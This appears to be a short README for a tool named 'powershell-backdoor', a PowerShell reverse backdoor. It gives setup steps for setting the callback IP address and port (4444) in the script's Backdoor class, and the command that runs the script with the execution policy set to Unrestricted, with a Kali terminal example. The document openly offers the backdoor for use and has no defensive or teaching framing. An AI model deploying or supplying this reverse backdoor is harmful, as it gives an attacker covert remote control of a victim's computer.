# powershell-backdoor
A simple Powershell Reverse Backdoor


# Setup
Find the class Backdoor, and change the following lines 
```powershell
class Backdoor {
  # Change this to the correct ip/port
  [string]$ipAddress = "127.0.0.1"
  [int]$port = 4444
```

# Execution
```cmd
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```
```cmd
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```
